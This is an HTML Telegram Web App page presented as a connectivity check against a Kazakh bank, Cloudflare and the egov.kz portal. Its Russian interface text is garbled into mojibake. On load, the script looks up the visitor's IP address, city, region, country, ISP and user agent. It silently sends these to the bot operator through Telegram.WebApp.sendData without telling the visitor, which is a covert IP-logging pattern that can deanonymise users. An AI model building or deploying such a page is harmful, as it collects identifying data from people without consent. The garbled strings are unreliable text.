<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f8;
      color: #333;
      text-align: center;
      padding: 20px;
    }
    h2 {
      color: #444;
    }
    .result {
      margin: 10px 0;
      font-size: 16px;
    }
    .ok { color: green; }
    .warn { color: orange; }
    .fail { color: red; }
    .done {
      margin-top: 20px;
      font-weight: bold;
      color: #2c3e50;
    }
    .close-btn {
      margin-top: 20px;
      padding: 10px 20px;
      font-size: 16px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h2>üîç –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è...</h2>
  <div class="result" id="status">‚è≥ –ü—Ä–æ–≤–µ—Ä–∫–∞...</div>
  <div class="result" id="ipinfo"></div>
  <div class="result" id="ping"></div>
  <div class="result" id="cf"></div>
  <div class="result" id="egov"></div>
  <div class="done" id="doneMsg" style="display:none;">–ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞, –º–æ–∂–µ—Ç–µ –∑–∞–∫—Ä—ã—Ç—å –æ–∫–Ω–æ</div>
  <button class="close-btn" class="done" id="doneMsg" style="display:none;" onclick="Telegram.WebApp.close()">–ó–∞–∫—Ä—ã—Ç—å</button>

  <script>
    async function sendData() {
      const status = document.getElementById("status");
      const ipinfo = document.getElementById("ipinfo");
      const ping = document.getElementById("ping");
      const cf = document.getElementById("cf");
      const egov = document.getElementById("egov");
      const doneMsg = document.getElementById("doneMsg");

      if (!Telegram.WebApp || !Telegram.WebApp.initData || Telegram.WebApp.initData.length === 0) {
        status.innerText = "‚ùå –û—Ç–∫—Ä–æ–π—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É —á–µ—Ä–µ–∑ Telegram";
        status.className = "result fail";
        return;
      }

      try {
        const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
        const userAgent = navigator.userAgent;

        ipinfo.innerHTML = `
          <strong>–í–∞—à IP:</strong> ${ipData.ip} <br>
          <strong>–ì–æ—Ä–æ–¥:</strong> ${ipData.city} <br>
          <strong>–°—Ç—Ä–∞–Ω–∞:</strong> ${ipData.country_name} <br>
          <strong>–ü—Ä–æ–≤–∞–π–¥–µ—Ä:</strong> ${ipData.org}
        `;

        // –ü–∏–Ω–≥ –∫ bankffin.kz
        const startBank = performance.now();
        fetch("https://bankffin.kz", { mode: "no-cors" })
          .then(() => {
            const time = Math.round(performance.now() - startBank);
            ping.innerHTML = `‚úÖ –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å –±–∞–Ω–∫–æ–º –§—Ä–∏–¥–æ–º –ë–∞–Ω–∫ –ö–∞–∑–∞—Ö—Å—Ç–∞–Ω: ${time} –º—Å (${ratePing(time)})`;
            ping.className = "result " + rateClass(time);
          })
          .catch(() => {
            ping.innerHTML = "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–µ–¥–∏–Ω–∏—Ç—å—Å—è —Å –±–∞–Ω–∫–æ–º –§—Ä–∏–¥–æ–º –ë–∞–Ω–∫ –ö–∞–∑–∞—Ö—Å—Ç–∞–Ω";
            ping.className = "result fail";
          })
          .finally(() => checkAllDone());

        // Cloudflare
        const startCF = performance.now();
        fetch("https://www.cloudflare.com/cdn-cgi/trace", { mode: "no-cors" })
          .then(() => {
            const time = Math.round(performance.now() - startCF);
            cf.innerHTML = `‚úÖ –°–µ—Ä–≤–∏—Å Cloudflare –¥–æ—Å—Ç—É–ø–µ–Ω: ${time} –º—Å (${ratePing(time)})`;
            cf.className = "result " + rateClass(time);
          })
          .catch(() => {
            cf.innerHTML = "‚ùå –°–µ—Ä–≤–∏—Å Cloudflare –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –∏–ª–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω";
            cf.className = "result fail";
          })
          .finally(() => checkAllDone());

        // egov.kz ‚Äî –ø—Ä–æ–≤–µ—Ä–∫–∞ –≥–æ—Å. –ø–æ—Ä—Ç–∞–ª–∞ –†–ö
        const startEgov = performance.now();
        fetch("https://egov.kz", { mode: "no-cors" })
          .then(() => {
            const time = Math.round(performance.now() - startEgov);
            egov.innerHTML = `‚úÖ –°–≤—è–∑—å —Å –ø–æ—Ä—Ç–∞–ª–æ–º egov.kz: ${time} –º—Å (${ratePing(time)})`;
            egov.className = "result " + rateClass(time);
          })
          .catch(() => {
            egov.innerHTML = "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–≤—è–∑–∞—Ç—å—Å—è —Å –ø–æ—Ä—Ç–∞–ª–æ–º egov.kz";
            egov.className = "result fail";
          })
          .finally(() => checkAllDone());

        const payload = {
          ip: ipData.ip,
          city: ipData.city,
          region: ipData.region,
          country: ipData.country_name,
          org: ipData.org,
          ua: userAgent
        };

        Telegram.WebApp.sendData(JSON.stringify(payload));
        status.innerText = "‚úÖ –î–∞–Ω–Ω—ã–µ –∑–∞–≥—Ä—É–∂–µ–Ω—ã";
        status.className = "result ok";
      } catch (e) {
        status.innerText = "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏: " + e.message;
        status.className = "result fail";
      }
    }

    function ratePing(ms) {
      if (ms <= 100) return "üü¢";
      if (ms <= 500) return "üü†";
      return "üî¥";
    }

    function rateClass(ms) {
      if (ms <= 100) return "ok";
      if (ms <= 300) return "warn";
      return "fail";
    }

    let completedChecks = 0;
    function checkAllDone() {
      completedChecks++;
      if (completedChecks >= 3) {
        document.getElementById("doneMsg").style.display = "block";
      }
    }

    window.addEventListener('DOMContentLoaded', () => {
      setTimeout(sendData, 500);
    });
  </script>
</body>
</html>
